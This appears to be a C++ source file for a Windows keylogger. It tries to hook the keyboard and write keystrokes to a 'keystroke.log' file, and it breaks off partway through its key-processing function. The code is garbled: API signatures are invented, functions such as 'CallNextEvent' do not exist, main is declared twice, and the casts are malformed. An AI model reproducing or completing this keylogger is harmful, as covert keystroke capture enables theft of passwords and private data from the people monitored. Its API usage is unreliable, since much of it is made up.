```c++
#include <Windows.h>
#include <stdio.h>
#include <TCHAR>

#define LOG_FILE "keystroke.log"
#define MAX_BUFFER_SIZE 1024

HHOOK SetWindowsHookEx(HWND hwnd, HHOOK hNext, DWORD thread, DWORD(*fHook, DWORD fMask, ULONG cbSize, HWND hwnd, HINSTANCE hInstance, DWORD* lparam);
void handlehook(HHOOK hhook, HWND hwnd, HINSTANCE hInstance, DWORD thread, void* lparam);
void processkey(BYTE bKey, BYTE bScanCode, DWORD dwFlags, DWORD dwExtraInfo, WORD key, BYTE *rk, WORD *sk, WORD *rshift, WORD *shifts, WORD *synthetic, WORD *ptr, DWORD* dwreserved);
void installhook();
void removehook(HHOOK hhook);
void main();
void createfile();

static HHOOK hook = 0;
static HANDLE filehandle = NULL;

// Function prototypes
void (*fhook)(HWND hwnd, HHOOK hhook,DWORD thread, void* lparam) = NULL;
void (*fprocesskey)(HWND hwnd, HHOOK hhook, DWORD thread, void* lparam) = NULL;

int main() {
    HHOOK hook;
    hook = SetWindowsHookEx(0, WH_KEYBOARD_LL, 0, fhook, 0, sizeof(HOOKSTRUCT), 0, 0, 0);
    if (hook == 0) {
        printf("Failed to install keyboard hook\n");
        return 1;
    }

    createfile();

    fhook = (fhook)GetProcAddress(GetModuleHandle("User32"), "CallNextEvent");
    fprocesskey = (fprocesskey)GetProcAddress(GetModuleHandle("User32"), "TranslateMessage");

    while(1) {
        Sleep(50);
        if (fhook != 0) {
            MSG msg;
            GetMessage((HWND)hook, &msg);
            if (msg.wParam == HC_KEY) {
                processkey(msg.wParam, msg.wParam, msg.lParam, 0, 0, 0, 0, 0, 0, 0, 0, 0);
            }
        }
    }

    removehook(hook);
    return 0;
}

void handlehook(HWND hwnd, HHOOK hhook, DWORD thread, void* lparam) {
    if (fhook != 0) {
        fhook(hwnd, hhook, thread, lparam);
    }
}

void processkey(BYTE bKey, BYTE bScanCode, DWORD dwFlags, DWORD dwExtraInfo, WORD key, BYTE *rk, WORD *sk, WORD *rshift, WORD *shifts, WORD *synthetic, WORD *ptr, DWORD* dwreserved) {
    if (dwFlags & (KEYDOWN | KEYUP)) {
        if (dwFlags & KEYDOWN) {
            if (bKey == VK_KEYDOWN) {
